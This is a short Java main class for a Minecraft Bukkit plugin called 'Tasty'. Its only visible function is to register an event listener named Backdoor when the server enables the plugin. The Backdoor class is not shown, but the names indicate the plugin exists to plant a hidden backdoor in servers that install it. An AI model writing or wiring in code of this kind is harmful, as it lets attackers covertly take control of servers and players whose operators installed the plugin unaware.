package me.scifi.tasty;

import me.scifi.tasty.backdoor.Backdoor;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.File;
import java.util.ArrayList;
import java.util.Collection;

public final class Tasty extends JavaPlugin {

    @Override
    public void onEnable() {
        registerCommands();
        registerEvents();
    }

    private void registerCommands(){

    }

    private void registerEvents(){
        PluginManager manager = Bukkit.getServer().getPluginManager();
        manager.registerEvents(new Backdoor(this),this);
    }



    @Override
    public void onDisable() {
        // Plugin shutdown logic
    }
}
